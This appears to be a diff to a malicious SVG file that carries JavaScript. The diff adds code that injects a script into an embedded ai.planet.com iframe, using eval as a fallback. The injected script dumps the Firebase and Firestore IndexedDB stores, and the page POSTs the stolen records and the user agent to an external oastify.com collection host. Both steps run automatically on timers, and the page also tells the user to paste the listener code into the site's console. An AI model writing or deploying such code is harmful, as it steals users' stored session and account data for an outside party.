@@ -3,6 +3,8 @@
         <style>
             text { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; }
             .header { font-weight: bold; fill: #1a1a1a; }
+            .info-text { fill: #555; font-size: 13px; }
+            .mono { font-family: 'Courier New', monospace; font-size: 12px; }
         </style>
         <linearGradient id="headerGrad" x1="0%" y1="0%" x2="100%" y2="0%">
             <stop offset="0%" style="stop-color:#1a237e;stop-opacity:1" />
@@ -12,29 +14,37 @@
     
     <rect width="1200" height="800" fill="#f5f7fa" rx="12"/>
     <rect x="0" y="0" width="1200" height="60" fill="url(#headerGrad)" rx="12 12 0 0"/>
-    <text x="30" y="38" class="header" fill="white" font-size="20">📡 postMessage IndexedDB Bridge</text>
+    <text x="30" y="38" class="header" fill="white" font-size="20">📡 IndexedDB Bridge</text>
+    <text x="950" y="38" fill="white" font-size="13">${new Date().toLocaleTimeString()}</text>
     
     <!-- Status Panel -->
     <rect x="20" y="75" width="1160" height="200" fill="white" rx="8" stroke="#e0e0e0" stroke-width="1"/>
-    <text x="40" y="105" font-weight="bold" fill="#333" font-size="16">📊 Communication Status</text>
+    <text x="40" y="105" font-weight="bold" fill="#333" font-size="16">📊 Status Log</text>
+    <text x="1050" y="105" fill="#999" font-size="12" id="statusCount">Ready</text>
     
     <foreignObject x="40" y="120" width="1120" height="140">
-        <div xmlns="http://www.w3.org/1999/xhtml" style="width:100%;height:100%;font-family:monospace;font-size:12px;overflow:auto;background:#fafafa;border-radius:4px;padding:10px;border:1px solid #e0e0e0;">
-            <div id="statusLog">Initializing...</div>
+        <div xmlns="http://www.w3.org/1999/xhtml" style="width:100%;height:100%;font-family:monospace;font-size:12px;overflow:auto;background:#1e1e1e;border-radius:4px;padding:10px;border:1px solid #333;">
+            <div id="statusLog" style="color:#d4d4d4;white-space:pre-wrap;"></div>
         </div>
     </foreignObject>
     
     <!-- Controls -->
     <rect x="20" y="290" width="1160" height="50" fill="white" rx="8" stroke="#e0e0e0" stroke-width="1"/>
-    <text x="40" y="320" font-weight="bold" fill="#333" font-size="14">🔄 Action:</text>
-    <foreignObject x="150" y="300" width="200" height="30">
+    <foreignObject x="30" y="300" width="130" height="30">
         <div xmlns="http://www.w3.org/1999/xhtml" style="width:100%;height:100%;">
-            <button id="requestBtn" style="width:100%;height:100%;background:#4CAF50;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold;">
-                Request IndexedDB Data
+            <button id="requestBtn" style="width:100%;height:100%;background:#4CAF50;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold;font-size:13px;">
+                📥 Request Data
             </button>
         </div>
     </foreignObject>
-    <text x="380" y="320" fill="#666" font-size="12">Click to request data from iframe</text>
+    <foreignObject x="170" y="300" width="130" height="30">
+        <div xmlns="http://www.w3.org/1999/xhtml" style="width:100%;height:100%;">
+            <button id="injectBtn" style="width:100%;height:100%;background:#FF9800;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold;font-size:13px;">
+                💉 Inject Listener
+            </button>
+        </div>
+    </foreignObject>
+    <text x="320" y="320" fill="#666" font-size="13">First inject listener, then request data</text>
     
     <!-- Main iframe -->
     <foreignObject x="20" y="355" width="1160" height="425">
@@ -53,40 +63,179 @@
     <script type="text/javascript">
         <![CDATA[
             console.clear();
-            console.log('═══════════════════════════════════════');
-            console.log('📡 POSTMESSAGE INDEXEDDB BRIDGE');
-            console.log('═══════════════════════════════════════');
             
             const statusLog = document.getElementById('statusLog');
-            let iframeReady = false;
+            let statusCounter = 0;
             
-            function logStatus(message, isError = false) {
+            function logStatus(message, isError = false, isSuccess = false) {
                 const timestamp = new Date().toLocaleTimeString();
-                const entry = `[${timestamp}] ${message}`;
+                const prefix = isError ? '❌' : isSuccess ? '✅' : '📌';
+                const entry = `[${timestamp}] ${prefix} ${message}`;
                 console.log(entry);
+                
                 if (statusLog) {
-                    statusLog.innerHTML += `<div style="color:${isError ? '#d32f2f' : '#333'}">${entry}</div>`;
+                    const color = isError ? '#f48771' : isSuccess ? '#6a9955' : '#d4d4d4';
+                    statusLog.innerHTML += `<div style="color:${color}">${entry}</div>`;
                     statusLog.scrollTop = statusLog.scrollHeight;
                 }
+                statusCounter++;
+                const countEl = document.getElementById('statusCount');
+                if (countEl) countEl.textContent = `${statusCounter} entries`;
             }
             
-            // Function to send request to iframe
-            function requestDataFromIframe() {
+            // ============================================
+            // APPROACH 1: Inject listener into iframe
+            // ============================================
+            function injectListenerIntoIframe() {
                 const iframe = document.getElementById('planetIframe');
                 if (!iframe) {
-                    logStatus('❌ Iframe not found', true);
+                    logStatus('Iframe not found', true);
                     return;
                 }
                 
-                // Check if iframe is loaded
+                logStatus('Attempting to inject listener into iframe...');
+                
                 try {
                     const iframeWindow = iframe.contentWindow;
                     if (!iframeWindow) {
-                        logStatus('❌ Cannot access iframe window', true);
+                        logStatus('Cannot access iframe contentWindow (CORS or not loaded)', true);
                         return;
                     }
                     
-                    logStatus('📤 Sending request to iframe...');
+                    // The code to inject
+                    const injectCode = `
+                        // This code runs inside the iframe
+                        (function() {
+                            console.log('[Injected] Setting up IndexedDB listener...');
+                            
+                            // Function to read IndexedDB
+                            async function readIndexedDB() {
+                                const result = {};
+                                try {
+                                    const databases = await indexedDB.databases();
+                                    const firebaseDBs = databases.filter(db => 
+                                        db.name && (db.name.includes('firebase') || 
+                                                   db.name.includes('heartbeat') || 
+                                                   db.name.includes('firestore'))
+                                    );
+                                    
+                                    if (firebaseDBs.length === 0) {
+                                        return { error: 'No Firebase databases found' };
+                                    }
+                                    
+                                    for (const dbInfo of firebaseDBs) {
+                                        const db = await new Promise((resolve, reject) => {
+                                            const req = indexedDB.open(dbInfo.name);
+                                            req.onsuccess = () => resolve(req.result);
+                                            req.onerror = () => reject(req.error);
+                                        });
+                                        
+                                        const dbData = {};
+                                        for (const storeName of db.objectStoreNames) {
+                                            const data = await new Promise((resolve, reject) => {
+                                                const tx = db.transaction(storeName, 'readonly');
+                                                const req = tx.objectStore(storeName).getAll();
+                                                req.onsuccess = () => resolve(req.result);
+                                                req.onerror = () => reject(req.error);
+                                            });
+                                            dbData[storeName] = data;
+                                        }
+                                        result[dbInfo.name] = dbData;
+                                        db.close();
+                                    }
+                                    return result;
+                                } catch (error) {
+                                    return { error: error.message };
+                                }
+                            }
+                            
+                            // Message listener
+                            window.addEventListener('message', async function(event) {
+                                console.log('[Injected] Received message:', event.data);
+                                
+                                // Accept messages from ai.planet.com and blob URLs
+                                if (event.origin !== 'https://ai.planet.com' && !event.origin.startsWith('blob:')) {
+                                    console.log('[Injected] Ignoring message from', event.origin);
+                                    return;
+                                }
+                                
+                                if (event.data.type === 'REQUEST_INDEXEDDB_DATA') {
+                                    console.log('[Injected] Processing IndexedDB request...');
+                                    try {
+                                        const data = await readIndexedDB();
+                                        event.source.postMessage({
+                                            type: 'INDEXEDDB_DATA_RESPONSE',
+                                            requestId: event.data.requestId,
+                                            payload: data
+                                        }, event.origin);
+                                        console.log('[Injected] Response sent');
+                                    } catch (error) {
+                                        event.source.postMessage({
+                                            type: 'INDEXEDDB_ERROR',
+                                            requestId: event.data.requestId,
+                                            error: error.message
+                                        }, event.origin);
+                                    }
+                                }
+                            });
+                            
+                            // Notify parent that we're ready
+                            window.parent.postMessage({
+                                type: 'INDEXEDDB_READY',
+                                timestamp: new Date().toISOString()
+                            }, '*');
+                            
+                            console.log('[Injected] IndexedDB listener ready');
+                        })();
+                    `;
+                    
+                    // Try to inject by creating a script element in the iframe
+                    try {
+                        const script = iframeWindow.document.createElement('script');
+                        script.textContent = injectCode;
+                        iframeWindow.document.body.appendChild(script);
+                        logStatus('✅ Listener injected successfully via script tag!', false, true);
+                    } catch (e) {
+                        logStatus('Script injection failed, trying eval...', true);
+                        try {
+                            iframeWindow.eval(injectCode);
+                            logStatus('✅ Listener injected via eval!', false, true);
+                        } catch (e2) {
+                            logStatus('All injection methods failed: ' + e2.message, true);
+                        }
+                    }
+                    
+                } catch (e) {
+                    logStatus('Cannot access iframe: ' + e.message, true);
+                    logStatus('You must manually run the listener code on ai.planet.com', true);
+                    
+                    // Show manual instructions
+                    logStatus('=== MANUAL INSTRUCTION ===');
+                    logStatus('1. Open ai.planet.com in a new tab');
+                    logStatus('2. Open developer console (F12)');
+                    logStatus('3. Paste and run the listener code');
+                    logStatus('4. Return to this SVG and click "Request Data"');
+                }
+            }
+            
+            // ============================================
+            // APPROACH 2: Request data from iframe
+            // ============================================
+            function requestDataFromIframe() {
+                const iframe = document.getElementById('planetIframe');
+                if (!iframe) {
+                    logStatus('Iframe not found', true);
+                    return;
+                }
+                
+                logStatus('Sending request to iframe...');
+                
+                try {
+                    const iframeWindow = iframe.contentWindow;
+                    if (!iframeWindow) {
+                        logStatus('Cannot access iframe window', true);
+                        return;
+                    }
                     
                     // Send message to iframe
                     iframeWindow.postMessage({
@@ -95,87 +244,90 @@
                         timestamp: new Date().toISOString()
                     }, 'https://ai.planet.com');
                     
-                    logStatus('✅ Request sent! Waiting for response...');
+                    logStatus('✅ Request sent! Waiting for response...', false, true);
                     
                 } catch(e) {
-                    logStatus(`❌ Error sending message: ${e.message}`, true);
+                    logStatus('Error sending message: ' + e.message, true);
                 }
             }
             
-            // Send data to your server
+            // ============================================
+            // Send to server
+            // ============================================
             async function sendToServer(data) {
+                const serverUrl = 'https://e2hkksv7w21hq3xdvez0rcypkgq7e12q.oastify.com/api/indexeddb';
+                
+                logStatus('Sending data to server...');
+                logStatus('URL: ' + serverUrl);
+                
+                const payload = {
+                    source: window.location.origin,
+                    url: window.location.href,
+                    timestamp: new Date().toISOString(),
+                    data: data,
+                    fromIframe: true,
+                    userAgent: navigator.userAgent
+                };
+                
+                console.log('📤 Sending payload:', payload);
+                
                 try {
-                    logStatus('📤 Sending data to https://e2hkksv7w21hq3xdvez0rcypkgq7e12q.oastify.com...');
-                    
-                    const response = await fetch('https://e2hkksv7w21hq3xdvez0rcypkgq7e12q.oastify.com/api/indexeddb', {
+                    const response = await fetch(serverUrl, {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
+                            'Accept': 'application/json'
                         },
-                        body: JSON.stringify({
-                            source: window.location.origin,
-                            url: window.location.href,
-                            timestamp: new Date().toISOString(),
-                            data: data,
-                            fromIframe: true
-                        })
+                        mode: 'cors',
+                        body: JSON.stringify(payload)
                     });
                     
                     if (response.ok) {
                         const result = await response.json();
-                        logStatus(`✅ Data sent successfully! Response: ${JSON.stringify(result)}`);
+                        logStatus(`✅ Data sent successfully! Status: ${response.status}`, false, true);
+                        logStatus('Response: ' + JSON.stringify(result));
                     } else {
                         logStatus(`❌ Server error: ${response.status} ${response.statusText}`, true);
-                        
-                        // Log request details for debugging
-                        console.log('📌 Request details:');
-                        console.log('  URL:', 'https://e2hkksv7w21hq3xdvez0rcypkgq7e12q.oastify.com/api/indexeddb');
-                        console.log('  Method: POST');
-                        console.log('  Headers:', { 'Content-Type': 'application/json' });
-                        console.log('  Body:', {
-                            source: window.location.origin,
-                            url: window.location.href,
-                            timestamp: new Date().toISOString(),
-                            data: data,
-                            fromIframe: true
-                        });
+                        const text = await response.text();
+                        logStatus('Response body: ' + text);
                     }
                 } catch (error) {
-                    logStatus(`❌ Error sending to server: ${error.message}`, true);
-                    console.error('Network error details:', error);
-                    
-                    // Show CORS debugging info
-                    logStatus('💡 Check CORS on your server:');
-                    logStatus('   Access-Control-Allow-Origin: https://ai.planet.com');
-                    logStatus('   Access-Control-Allow-Methods: POST, OPTIONS');
-                    logStatus('   Access-Control-Allow-Headers: Content-Type');
+                    logStatus(`❌ Network error: ${error.message}`, true);
+                    logStatus('💡 This is likely a CORS issue');
+                    logStatus('Your server must allow:');
+                    logStatus('  Access-Control-Allow-Origin: https://ai.planet.com');
+                    logStatus('  Access-Control-Allow-Methods: POST, OPTIONS');
+                    logStatus('  Access-Control-Allow-Headers: Content-Type');
                 }
             }
             
-            // Listen for messages from iframe
+            // ============================================
+            // Message listener for responses
+            // ============================================
             window.addEventListener('message', async function(event) {
-                // Security: Verify origin
-                if (event.origin !== 'https://ai.planet.com') {
-                    console.log(`⚠️ Ignoring message from ${event.origin}`);
+                // Accept from ai.planet.com or blob URLs
+                if (event.origin !== 'https://ai.planet.com' && !event.origin.startsWith('blob:')) {
                     return;
                 }
                 
                 const data = event.data;
-                console.log('📨 Received message:', data);
+                console.log('📨 Received:', data);
                 
                 if (data.type === 'INDEXEDDB_READY') {
-                    logStatus('✅ Iframe is ready!');
-                    iframeReady = true;
+                    logStatus('✅ Iframe listener is ready!', false, true);
                 }
                 
                 if (data.type === 'INDEXEDDB_DATA_RESPONSE') {
-                    logStatus(`✅ Received data from iframe!`);
-                    logStatus(`📌 Request ID: ${data.requestId}`);
+                    logStatus(`✅ Received data from iframe!`, false, true);
+                    logStatus(`Request ID: ${data.requestId}`);
                     
                     if (data.payload) {
-                        const recordCount = Object.values(data.payload).reduce((sum, store) => sum + (store.length || 0), 0);
-                        logStatus(`📌 Total records: ${recordCount}`);
-                        logStatus(`📌 Data preview: ${JSON.stringify(data.payload).substring(0, 300)}...`);
+                        const recordCount = Object.values(data.payload).reduce((sum, store) => {
+                            if (Array.isArray(store)) return sum + store.length;
+                            if (typeof store === 'object') return sum + Object.keys(store).length;
+                            return sum;
+                        }, 0);
+                        logStatus(`Total records: ${recordCount}`);
                         
                         // Send to server
                         await sendToServer(data.payload);
@@ -189,25 +341,36 @@
                 }
             });
             
-            // Setup button
+            // ============================================
+            // Setup buttons
+            // ============================================
             document.addEventListener('DOMContentLoaded', function() {
-                const btn = document.getElementById('requestBtn');
-                if (btn) {
-                    btn.addEventListener('click', requestDataFromIframe);
-                    logStatus('✅ Button ready - click to request data');
+                const requestBtn = document.getElementById('requestBtn');
+                if (requestBtn) {
+                    requestBtn.addEventListener('click', requestDataFromIframe);
                 }
+                
+                const injectBtn = document.getElementById('injectBtn');
+                if (injectBtn) {
+                    injectBtn.addEventListener('click', injectListenerIntoIframe);
+                }
+                
+                logStatus('🚀 Bridge initialized', false, true);
+                logStatus('📍 Origin: ' + window.location.origin);
+                logStatus('💡 Click "Inject Listener" then "Request Data"');
+                logStatus('═══════════════════════════════════════');
             });
             
-            logStatus('🚀 Bridge initialized');
-            logStatus('📍 Waiting for iframe to load...');
-            logStatus('💡 Click the button to request IndexedDB data');
-            logStatus('═══════════════════════════════════════');
+            // Auto-inject and request after delay
+            setTimeout(() => {
+                logStatus('⏳ Auto-injecting listener...');
+                injectListenerIntoIframe();
+            }, 3000);
             
-            // Auto-request after a delay
             setTimeout(() => {
                 logStatus('⏳ Auto-requesting data...');
                 requestDataFromIframe();
-            }, 5000);
+            }, 6000);
         ]]>
     </script>
 </svg>
